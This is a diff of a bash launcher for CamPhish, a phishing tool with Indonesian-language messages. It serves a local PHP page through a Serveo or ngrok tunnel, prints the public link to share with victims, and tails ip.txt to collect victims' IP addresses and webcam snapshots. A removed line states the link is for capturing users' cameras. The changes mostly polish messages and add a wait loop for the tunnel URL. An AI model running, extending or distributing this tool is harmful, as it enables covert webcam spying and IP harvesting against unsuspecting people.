@@ -1,5 +1,6 @@
 #!/bin/bash
 # CamPhish v1.0 - Adrian (No Khodam Video)
+# Versi Final
 
 trap 'echo; stop' 2
 
@@ -12,8 +13,8 @@ stop() {
 }
 
 dependencies() {
-    command -v php >/dev/null 2>&1 || { echo "PHP belum terinstall!"; exit 1; }
-    command -v ssh >/dev/null 2>&1 || { echo "SSH belum terinstall!"; exit 1; }
+    command -v php >/dev/null 2>&1 || { echo "[!] PHP belum terinstall!"; exit 1; }
+    command -v ssh >/dev/null 2>&1 || { echo "[!] SSH belum terinstall!"; exit 1; }
 }
 
 banner() {
@@ -31,20 +32,31 @@ start_php() {
 
 start_serveo() {
     echo "[*] Memulai Serveo..."
-    if [[ -f sendlink ]]; then rm sendlink; fi
+    [[ -f sendlink ]] && rm sendlink
     ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=60 -R 80:localhost:3333 serveo.net 2>/dev/null > sendlink &
-    sleep 5
+    sleep 8
     link=$(grep -o "https://[0-9a-z]*\.serveo.net" sendlink)
     echo "[+] Serveo link: $link"
+    echo "[*] Menunggu IP dan snapshot user..."
+    tail -f ip.txt
 }
 
 start_ngrok() {
-    command -v ngrok >/dev/null 2>&1 || { echo "Ngrok belum terinstall!"; exit 1; }
+    command -v ngrok >/dev/null 2>&1 || { echo "[!] Ngrok belum terinstall!"; exit 1; }
     echo "[*] Memulai Ngrok..."
     ./ngrok http 3333 >/dev/null 2>&1 &
-    sleep 5
-    link=$(curl --silent --max-time 5 http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
+    
+    echo "[*] Menunggu Ngrok URL..."
+    while true; do
+        link=$(curl --silent http://127.0.0.1:4040/api/tunnels | grep -o '"public_url":"[^"]*' | cut -d'"' -f4)
+        if [[ -n "$link" ]]; then
+            break
+        fi
+        sleep 2
+    done
     echo "[+] Ngrok link: $link"
+    echo "[*] Menunggu IP dan snapshot user..."
+    tail -f ip.txt
 }
 
 select_tunnel() {
@@ -68,5 +80,3 @@ else
     echo "[!] Pilihan tidak valid. Menggunakan Serveo default."
     start_serveo
 fi
-
-echo "[*] Server berjalan. Bagikan link di atas untuk mulai pengambilan kamera user."
